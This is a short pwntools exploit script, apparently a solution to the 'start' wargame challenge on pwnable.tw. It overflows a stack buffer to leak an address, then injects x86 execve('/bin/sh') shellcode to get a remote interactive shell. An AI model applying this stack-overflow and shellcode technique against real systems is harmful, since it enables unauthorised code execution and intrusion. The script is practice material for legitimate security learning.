from pwn import *

context(arch="i386", os="linux")

# p = process("./start")
p = remote("chall.pwnable.tw", 10000)


e = ELF("./start")
# rop = ROP(e)

payload = asm('nop') * 20
payload += p32(0x8048087)

p.recvuntil(b"Let's start the CTF:")
p.send(payload)

stack_addr = u32(p.recv(4))

payload = asm('nop')* 0x14
payload += p32(stack_addr + 0x14)
payload += b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"

p.sendline(payload)

p.interactive()
